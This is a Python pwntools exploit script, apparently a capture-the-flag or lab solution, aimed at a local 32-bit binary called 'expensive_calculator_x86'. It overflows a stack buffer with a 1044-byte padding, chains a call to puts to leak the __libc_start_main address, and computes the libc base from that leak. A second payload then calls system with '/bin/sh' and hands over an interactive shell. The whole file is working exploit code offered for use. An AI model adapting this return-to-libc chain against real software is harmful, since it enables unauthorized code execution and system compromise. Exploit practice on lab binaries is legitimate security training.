#!/usr/bin/python3
import time
from pwn import *

sh = process('./expensive_calculator_x86')

expensive_ = ELF('./expensive_calculator_x86')

puts_plt = expensive_.plt['puts']

libc_start_main_got = expensive_.got['__libc_start_main']
main = expensive_.symbols['main']

print('puts ', hex(puts_plt))
print('libc_start_main_got ', hex(libc_start_main_got))
print('main', hex(main))

print('Leak libc_start_main_got address and return to main again.')
payload = flat(['A'*1044, puts_plt, main, libc_start_main_got])

#sleep to wait for the whole output before the prompt
time.sleep(4)
#receive the output before the prompt
sh.recv()
#send input in order to overflow the buffer and write our ROP gadget to leak libc_start_main
sh.sendline(payload)

libc_start_main_addr = u32(sh.recv()[29:33])
print('leaked address libc_start_main ', hex(libc_start_main_addr))

libc = ELF('/lib32/libc-2.31.so')
system = libc.symbols['system']
binsh = 0x18f352

libcbase = libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libcbase + system
binsh_addr = libcbase + binsh

print('libc base ', hex(libcbase))
print('system address ', hex(system_addr))
print('binsh address ', hex(binsh_addr))

payload = flat(['A'* 1044, system_addr, 0xdeadbeef, binsh_addr])

time.sleep(4)
sh.sendline(payload)
sh.interactive()


